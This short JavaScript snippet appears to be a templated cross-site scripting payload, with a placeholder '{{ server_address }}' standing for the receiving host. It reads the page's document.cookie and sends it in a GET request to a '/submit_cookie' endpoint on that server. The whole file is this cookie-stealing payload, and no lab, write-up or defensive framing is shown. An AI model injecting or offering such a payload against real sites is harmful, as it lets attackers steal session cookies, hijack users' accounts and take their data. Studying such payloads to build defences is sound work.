let httpRequest = new XMLHttpRequest();
httpRequest.open('GET', 'https://{{ server_address }}/submit_cookie?cookie=' + document.cookie);
httpRequest.send();